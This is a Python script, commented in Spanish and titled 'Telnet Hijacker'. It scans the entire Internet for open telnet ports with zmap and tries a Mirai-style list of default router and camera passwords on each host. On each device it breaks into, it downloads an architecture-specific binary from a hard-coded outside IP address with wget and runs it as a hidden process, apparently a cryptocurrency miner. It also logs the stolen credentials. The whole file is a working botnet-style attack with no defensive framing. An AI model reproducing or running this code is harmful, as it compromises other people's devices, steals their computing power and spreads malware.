#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import os
import sys
import time
import threading
import telnetlib
import socket
from datetime import datetime
import random

class TelnetHijacker:
    def __init__(self):
        self.output_file = f"telnet_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.alive_file = "telnet_alive.txt"
        self.success_file = "telnet_hijacked.txt"
        self.attack_time = 600  # 10 minutos en segundos
        self.payload_url = "http://172.96.140.62:1283/bins/$b -O .x"
        
        # Combinaciones de credenciales para Telnet
        self.credenciales = [
            ("root", ""),
            ("root", "root"),
            ("root", "admin"),
            ("root", "1234"),
            ("root", "12345"),
            ("root", "password"),
            ("root", "default"),
            ("root", "123456"),
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "1234"),
            ("admin", "12345"),
            ("admin", "password"),
            ("admin", "default"),
            ("admin", "123456"),
            ("support", ""),
            ("user", "user"),
            ("user", ""),
            ("guest", ""),
            ("guest", "guest"),
            ("supervisor", "supervisor"),
            ("tech", "tech"),
            ("telnet", "telnet"),
            ("root", "Zte521"),
            ("root", "xc3511"),
            ("root", "vizxv"),
            ("root", "anko"),
            ("root", "5up"),
            ("root", "7ujMko0admin"),
            ("root", "realtek"),
            ("root", "00000000"),
            ("root", "1111"),
            ("root", "1111111"),
            ("root", "12341234"),
            ("root", "123456789"),
            ("root", "54321"),
            ("root", "666666"),
            ("root", "7ujMko0vizxv"),
            ("root", "7ujMko0admin"),
            ("root", "888888"),
            ("root", "admin1234"),
            ("root", "defaultpassword"),
            ("root", "hi3518"),
            ("root", "hikvision"),
            ("root", "ipcam"),
            ("root", "juantech"),
            ("root", "klv1234"),
            ("root", "klv123"),
            ("root", "pass"),
            ("root", "service"),
            ("root", "system"),
            ("root", "user"),
            ("root", "xc3511"),
            ("admin", "1111"),
            ("admin", "1111111"),
            ("admin", "12341234"),
            ("admin", "123456789"),
            ("admin", "54321"),
            ("admin", "666666"),
            ("admin", "888888"),
            ("admin", "admin1234"),
            ("admin", "defaultpassword"),
            ("admin", "hi3518"),
        ]
        
    def check_root(self):
        """Verificar si es root (necesario para zmap)"""
        if os.geteuid() != 0:
            print("❌ ERROR: Necesitas ejecutar como root (sudo)")
            print("   sudo python3 telnet_hijacker.py")
            sys.exit(1)
    
    def instalar_zmap(self):
        """Instalar zmap si no está instalado"""
        try:
            subprocess.run(["which", "zmap"], check=True, capture_output=True)
            print("✅ ZMAP ya está instalado")
        except:
            print("📦 Instalando ZMAP...")
            subprocess.run(["apt-get", "update", "-y"], check=False)
            subprocess.run(["apt-get", "install", "zmap", "-y"], check=False)
            print("✅ ZMAP instalado")
    
    def escaneo_rapido(self):
        """Escaneo ultra rápido con ZMAP - SOLO PUERTO 23 (Telnet)"""
        print("\n" + "="*60)
        print("🔍 INICIANDO ESCANEO RÁPIDO DE TELNET (23)")
        print("="*60)
        print("🎯 Buscando dispositivos en todo Internet...")
        print("⏱️  Escaneo rápido: ~4 minutos")
        print("="*60)
        
        # Escaneo optimizado para velocidad
        # Solo puerto 23, tasa alta, sin escaneo de versión
        cmd = [
            "zmap",
            "--target-port=23",      # Solo Telnet
            "--rate=100000",         # 100k paquetes/seg (MUY rápido)
            "--output-file=" + self.output_file,
            "--max-targets=0",       # Todo Internet
            "--cooldown-time=0",     # Sin cooldown
            "--retries=0",           # Sin reintentos
            "--no-cleanup",          # No limpiar
            "--quiet"               # Modo silencioso
        ]
        
        try:
            print("🚀 Escaneando... (esto tomará ~4 minutos)")
            start_time = time.time()
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Mostrar progreso
            while process.poll() is None:
                time.sleep(10)
                elapsed = time.time() - start_time
                print(f"   ⏳ Escaneando... {elapsed:.0f}s transcurridos")
            
            # Leer resultados
            if os.path.exists(self.output_file):
                with open(self.output_file, 'r') as f:
                    ips = f.readlines()
                
                print(f"\n✅ Escaneo completado en {time.time()-start_time:.0f}s")
                print(f"📊 Total IPs con puerto 23 abierto: {len(ips)}")
                
                # Guardar IPs vivas
                with open(self.alive_file, 'w') as f:
                    f.writelines(ips)
                
                return ips
            else:
                print("❌ No se generaron resultados")
                return []
                
        except Exception as e:
            print(f"❌ Error en escaneo: {e}")
            return []
    
    def intentar_login(self, ip, port=23):
        """Intentar login con combinaciones de credenciales"""
        for user, password in self.credenciales:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=3)
                
                try:
                    # Esperar login prompt
                    tn.read_until(b"login: ", timeout=2)
                    tn.write(user.encode('ascii') + b"\n")
                    
                    # Esperar password prompt
                    tn.read_until(b"Password: ", timeout=2)
                    tn.write(password.encode('ascii') + b"\n")
                    
                    # Verificar si entramos
                    time.sleep(1)
                    result = tn.read_very_eager()
                    
                    # Buscar indicadores de shell exitoso
                    if b"#" in result or b"$" in result or b">" in result:
                        print(f"\n✅ ACCESO CONSEGUIDO - {ip}")
                        print(f"   👤 Usuario: {user}")
                        print(f"   🔑 Password: {password}")
                        
                        # Guardar credenciales exitosas
                        with open(self.success_file, 'a') as f:
                            f.write(f"{ip}:{port}:{user}:{password}\n")
                        
                        return tn, user, password
                        
                except Exception as e:
                    tn.close()
                    continue
                    
            except Exception as e:
                continue
        
        return None, None, None
    
    def detectar_arquitectura(self, tn):
        """Detectar arquitectura del dispositivo"""
        try:
            # Comandos para detectar arquitectura
            tn.write(b"uname -m\n")
            time.sleep(1)
            arch = tn.read_very_eager().decode('utf-8', errors='ignore').strip()
            
            if "x86_64" in arch:
                return "x86_64"
            elif "i386" in arch or "i686" in arch or "i86" in arch:
                return "x86"
            elif "armv7" in arch:
                return "arm7"
            elif "armv6" in arch:
                return "arm6"
            elif "armv5" in arch:
                return "arm5"
            elif "aarch64" in arch or "arm64" in arch:
                return "aarch64"
            elif "mips" in arch:
                if "el" in arch:
                    return "mipsel"
                else:
                    return "mips"
            else:
                return "x86_64"
                
        except:
            return "x86_64"
    
    def desplegar_payload(self, tn, ip, user, password):
        """Desplegar y ejecutar el payload"""
        try:
            print(f"   🔧 Desplegando payload en {ip}...")
            
            # Limpiar y preparar
            tn.write(b"cd /tmp || cd /var/run || cd /dev/shm\n")
            time.sleep(0.5)
            
            # Matar procesos anteriores
            tn.write(b"killall .x 2>/dev/null\n")
            time.sleep(0.5)
            
            # Detectar arquitectura
            arch = self.detectar_arquitectura(tn)
            print(f"   🖥️  Arquitectura detectada: {arch}")
            
            # Comando completo adaptado
            if arch == "x86_64":
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "x86":
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm7":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm7 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm6":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm6 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm5":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm5 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "aarch64":
                cmd = b"wget -q http://172.96.140.62:1283/bins/aarch64 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "mips":
                cmd = b"wget -q http://172.96.140.62:1283/bins/mips -O .x && chmod +x .x && ./.x &\n"
            elif arch == "mipsel":
                cmd = b"wget -q http://172.96.140.62:1283/bins/mipsel -O .x && chmod +x .x && ./.x &\n"
            else:
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &\n"
            
            # Enviar comando
            tn.write(cmd)
            time.sleep(2)
            
            # Verificar que el proceso está corriendo
            tn.write(b"ps | grep .x\n")
            time.sleep(1)
            result = tn.read_very_eager().decode('utf-8', errors='ignore')
            
            if ".x" in result:
                print(f"   ✅ PAYLOAD ACTIVADO - Minando por 10 minutos")
                print(f"   ⏱️  Tiempo restante: 600s")
                
                # Registrar éxito
                with open("hijack_success.txt", 'a') as f:
                    f.write(f"{ip}:{user}:{password}:{arch}:{datetime.now()}\n")
                
                # Mantener conexión por 10 minutos
                for i in range(10, 0, -1):
                    time.sleep(60)
                    print(f"   ⏳ Minando... {i} minutos restantes")
                    tn.write(b"echo '⚡' > /dev/null 2>&1\n")
                
                return True
            else:
                print(f"   ⚠️  No se pudo verificar ejecución")
                return False
                
        except Exception as e:
            print(f"   ❌ Error desplegando: {e}")
            return False
    
    def atacar_ips(self, ips, max_threads=50):
        """Atacar múltiples IPs concurrentemente"""
        print(f"\n🔪 INICIANDO ATAQUE A {len(ips)} DISPOSITIVOS")
        print(f"⚡ Usando {max_threads} hilos concurrentes")
        print("="*60)
        
        threads = []
        hijacked = 0
        
        for i, ip in enumerate(ips[:1000]):  # Limitar a 1000 IPs para velocidad
            ip = ip.strip()
            if not ip:
                continue
                
            thread = threading.Thread(
                target=self.hijack_device,
                args=(ip,)
            )
            threads.append(thread)
            thread.start()
            
            # Control de hilos
            while len([t for t in threads if t.is_alive()]) >= max_threads:
                time.sleep(0.1)
            
            if (i+1) % 10 == 0:
                print(f"   📡 Escaneando... {i+1}/{len(ips)}")
        
        # Esperar que terminen todos
        for thread in threads:
            thread.join()
    
    def hijack_device(self, ip):
        """Hijackear un dispositivo individual"""
        try:
            # Intentar login
            tn, user, password = self.intentar_login(ip)
            
            if tn:
                # Desplegar payload
                if self.desplegar_payload(tn, ip, user, password):
                    print(f"   🎯 {ip} - HIJACKEADO EXITOSAMENTE")
                    tn.write(b"exit\n")
                
                tn.close()
                
        except Exception as e:
            pass
    
    def run(self):
        """Ejecutar escaneo completo"""
        print("="*60)
        print("🔥 TELNET HIJACKER - BUSCADOR DE DISPOSITIVOS")
        print("="*60)
        print("🎯 Objetivo: Routers, cámaras IP, IoT, etc")
        print("⚙️  Payload: Minería por 10 minutos")
        print("="*60)
        
        # Verificar root
        self.check_root()
        
        # Instalar zmap
        self.instalar_zmap()
        
        # Escaneo rápido
        ips = self.escaneo_rapido()
        
        if ips:
            # Atacar dispositivos
            self.atacar_ips(ips)
            
            print("\n" + "="*60)
            print("📊 RESUMEN FINAL")
            print("="*60)
            
            if os.path.exists(self.success_file):
                with open(self.success_file, 'r') as f:
                    hijacked = f.readlines()
                print(f"✅ Dispositivos hijackeados: {len(hijacked)}")
                print(f"📁 Lista guardada en: {self.success_file}")
            
            print("🎯 Ataque completado")
            print("⏱️  Tiempo total: ~14 minutos (4 escaneo + 10 minería)")
        else:
            print("❌ No se encontraron dispositivos")

if __name__ == "__main__":
    hijacker = TelnetHijacker()
    
    try:
        hijacker.run()
    except KeyboardInterrupt:
        print("\n\n⛔ Ataque interrumpido por el usuario")
    except Exception as e:
        print(f"\n❌ Error fatal: {e}")
